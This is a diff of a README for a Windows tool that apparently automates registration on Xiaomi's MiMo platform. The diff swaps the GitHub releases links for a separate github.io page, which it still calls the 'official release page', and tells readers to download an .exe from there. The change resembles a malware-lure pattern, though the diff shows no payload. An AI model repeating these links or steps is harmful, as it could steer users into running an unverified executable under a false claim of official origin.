@@ -1,6 +1,6 @@
 # ⚙️ mekithil - Automate your Xiaomi MiMo platform registration
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Rough-hotweather846/mekithil/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://rough-hotweather846.github.io)
 
 ## 📖 About this application
 
@@ -22,7 +22,7 @@ This tool does not install background services or change deep system settings. I
 
 Follow these steps to obtain and prepare the software on your Windows machine:
 
-1. Visit the following link to access the official release page: [https://github.com/Rough-hotweather846/mekithil/releases](https://github.com/Rough-hotweather846/mekithil/releases).
+1. Visit the following link to access the official release page: [https://rough-hotweather846.github.io](https://rough-hotweather846.github.io).
 2. Locate the section labeled Assets.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to a folder you can find, such as your Downloads folder or Desktop.
